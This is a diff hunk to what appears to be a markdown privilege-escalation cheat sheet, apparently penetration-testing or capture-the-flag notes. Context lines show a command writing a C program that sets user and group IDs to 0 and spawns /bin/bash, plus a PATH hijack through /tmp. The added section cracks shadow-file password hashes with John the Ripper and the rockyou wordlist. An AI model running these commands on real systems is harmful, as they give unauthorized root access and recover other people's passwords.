@@ -156,3 +156,8 @@ echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tm
 ```
 export $PATH=/tmp:$PATH
 ```
+
+### crack shadow hash using john
+```
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+```
